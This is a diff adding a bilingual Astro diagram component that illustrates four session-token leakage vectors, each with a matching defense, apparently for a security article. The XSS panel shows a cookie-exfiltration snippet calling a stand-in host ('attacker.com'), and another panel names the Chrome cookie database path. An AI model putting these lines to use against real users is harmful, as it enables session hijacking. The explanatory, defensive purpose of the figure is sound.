@@ -1,0 +1,104 @@
+---
+interface Props {
+  lang: 'ar' | 'en';
+}
+
+const { lang } = Astro.props;
+---
+
+<figure class="diagram-figure" aria-label={lang === 'ar' ? 'مخطط متجهات تسريب الجلسة' : 'Primary session token leakage vectors matrix'}>
+  <div class="diagram-header">
+    <span class="diagram-tag">{lang === 'ar' ? 'مخطط 05 / متجهات التسريب' : 'FIGURE 05 / LEAKAGE VECTORS'}</span>
+    <span>{lang === 'ar' ? 'كيف تغادر الجلسة بيئتها الآمنة؟' : 'SESSION COMPROMISE SURFACES'}</span>
+  </div>
+
+  <div class="diagram-svg-container" style="overflow-x: auto; -webkit-overflow-scrolling: touch;">
+    <svg viewBox="0 0 800 240" width="100%" height="auto" style="min-width: 640px; display: block;" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <pattern id="leak-hatch" width="6" height="6" patternTransform="rotate(45 0 0)" patternUnits="userSpaceOnUse">
+          <line x1="0" y1="0" x2="0" y2="6" stroke="#8F2D2D" stroke-width="0.75" stroke-opacity="0.2"/>
+        </pattern>
+      </defs>
+
+      <rect x="8" y="8" width="784" height="224" fill="#FAF8F2" stroke="#151515" stroke-width="1.2" stroke-opacity="0.25"/>
+
+      <!-- Vector 1: XSS -->
+      <g transform="translate(25, 30)">
+        <rect width="170" height="180" fill="#F4F1E9" stroke="#151515" stroke-width="1.4"/>
+        <rect width="170" height="24" fill="#EBE7DE" stroke="#151515" stroke-width="1"/>
+        <text x="10" y="16" font-family="'JetBrains Mono', monospace" font-size="8.5" font-weight="700" fill="#151515">01 / XSS (WEB LAYER)</text>
+        
+        <text x="10" y="44" font-family="sans-serif" font-size="8.5" font-weight="600" fill="#151515">DOM Injection</text>
+        <text x="10" y="60" font-family="sans-serif" font-size="7.5" fill="#5F5D56">Malicious JS executes within user origin context.</text>
+        
+        <rect x="8" y="75" width="154" height="36" fill="#FAF8F2" stroke="#8F2D2D" stroke-width="0.8"/>
+        <text x="14" y="90" font-family="'JetBrains Mono', monospace" font-size="7.5" fill="#8F2D2D">fetch('attacker.com', &#123;</text>
+        <text x="14" y="103" font-family="'JetBrains Mono', monospace" font-size="7.5" fill="#8F2D2D">  body: document.cookie</text>
+
+        <rect x="8" y="125" width="154" height="42" fill="#FAF8F2" stroke="#5F6849" stroke-width="0.8"/>
+        <text x="14" y="139" font-family="'JetBrains Mono', monospace" font-size="7.5" font-weight="600" fill="#5F6849">Primary Defense:</text>
+        <text x="14" y="153" font-family="'JetBrains Mono', monospace" font-size="7.5" fill="#151515">Set-Cookie: HttpOnly</text>
+      </g>
+
+      <!-- Vector 2: Infostealers -->
+      <g transform="translate(215, 30)">
+        <rect width="170" height="180" fill="#F4F1E9" stroke="#151515" stroke-width="1.4"/>
+        <rect width="170" height="24" fill="#EBE7DE" stroke="#151515" stroke-width="1"/>
+        <text x="10" y="16" font-family="'JetBrains Mono', monospace" font-size="8.5" font-weight="700" fill="#151515">02 / INFOSTEALERS</text>
+
+        <text x="10" y="44" font-family="sans-serif" font-size="8.5" font-weight="600" fill="#151515">Local Disk Harvest</text>
+        <text x="10" y="60" font-family="sans-serif" font-size="7.5" fill="#5F5D56">Malware accesses raw SQLite files from disk.</text>
+
+        <rect x="8" y="75" width="154" height="36" fill="#FAF8F2" stroke="#8F2D2D" stroke-width="0.8"/>
+        <text x="14" y="90" font-family="'JetBrains Mono', monospace" font-size="7.5" fill="#8F2D2D">AppData/Chrome/Default/</text>
+        <text x="14" y="103" font-family="'JetBrains Mono', monospace" font-size="7.5" fill="#8F2D2D">Network/Cookies.db</text>
+
+        <rect x="8" y="125" width="154" height="42" fill="#FAF8F2" stroke="#5F6849" stroke-width="0.8"/>
+        <text x="14" y="139" font-family="'JetBrains Mono', monospace" font-size="7.5" font-weight="600" fill="#5F6849">Primary Defense:</text>
+        <text x="14" y="153" font-family="sans-serif" font-size="7.5" fill="#151515">Endpoint EDR + App-Bound</text>
+      </g>
+
+      <!-- Vector 3: Endpoint Compromise -->
+      <g transform="translate(405, 30)">
+        <rect width="170" height="180" fill="#F4F1E9" stroke="#151515" stroke-width="1.4"/>
+        <rect width="170" height="24" fill="#EBE7DE" stroke="#151515" stroke-width="1"/>
+        <text x="10" y="16" font-family="'JetBrains Mono', monospace" font-size="8.5" font-weight="700" fill="#151515">03 / ENDPOINT BREAK</text>
+
+        <text x="10" y="44" font-family="sans-serif" font-size="8.5" font-weight="600" fill="#151515">Memory &amp; Extension</text>
+        <text x="10" y="60" font-family="sans-serif" font-size="7.5" fill="#5F5D56">Malicious browser extension or RAM scraping.</text>
+
+        <rect x="8" y="75" width="154" height="36" fill="#FAF8F2" stroke="#8F2D2D" stroke-width="0.8"/>
+        <text x="14" y="90" font-family="'JetBrains Mono', monospace" font-size="7.5" fill="#8F2D2D">chrome.cookies.getAll()</text>
+        <text x="14" y="103" font-family="'JetBrains Mono', monospace" font-size="7.5" fill="#8F2D2D">or debugger attachment</text>
+
+        <rect x="8" y="125" width="154" height="42" fill="#FAF8F2" stroke="#5F6849" stroke-width="0.8"/>
+        <text x="14" y="139" font-family="'JetBrains Mono', monospace" font-size="7.5" font-weight="600" fill="#5F6849">Primary Defense:</text>
+        <text x="14" y="153" font-family="sans-serif" font-size="7.5" fill="#151515">DPoP / mTLS device binding</text>
+      </g>
+
+      <!-- Vector 4: Weak Lifecycle -->
+      <g transform="translate(595, 30)">
+        <rect width="180" height="180" fill="#F4F1E9" stroke="#151515" stroke-width="1.4"/>
+        <rect width="180" height="24" fill="#EBE7DE" stroke="#151515" stroke-width="1"/>
+        <text x="10" y="16" font-family="'JetBrains Mono', monospace" font-size="8.5" font-weight="700" fill="#151515">04 / LIFECYCLE FLAWS</text>
+
+        <text x="10" y="44" font-family="sans-serif" font-size="8.5" font-weight="600" fill="#151515">Architecture Errors</text>
+        <text x="10" y="60" font-family="sans-serif" font-size="7.5" fill="#5F5D56">Infinite TTL, no rotation on login, or poor invalidation.</text>
+
+        <rect x="8" y="75" width="164" height="36" fill="#FAF8F2" stroke="#8F2D2D" stroke-width="0.8"/>
+        <text x="14" y="90" font-family="'JetBrains Mono', monospace" font-size="7.5" fill="#8F2D2D">Session Fixation</text>
+        <text x="14" y="103" font-family="'JetBrains Mono', monospace" font-size="7.5" fill="#8F2D2D">No logout server purge</text>
+
+        <rect x="8" y="125" width="164" height="42" fill="#FAF8F2" stroke="#5F6849" stroke-width="0.8"/>
+        <text x="14" y="139" font-family="'JetBrains Mono', monospace" font-size="7.5" font-weight="600" fill="#5F6849">Primary Defense:</text>
+        <text x="14" y="153" font-family="sans-serif" font-size="7.5" fill="#151515">Strict rotation + timeouts</text>
+      </g>
+    </svg>
+  </div>
+
+  <figcaption class="diagram-caption">
+    {lang === 'ar'
+      ? 'الشكل 05: المتجهات الأربعة الرئيسية لتسرب الجلسة — من ثغرات XSS البرمجية، مرورًا ببرمجيات Infostealers الخبيثة، وحتى إهمال تدوير الجلسات.'
+      : 'Figure 05: The four primary session leakage vectors — web-layer scripts, local infostealers, compromised extensions, and flawed lifecycle rules.'}
+  </figcaption>
+</figure>
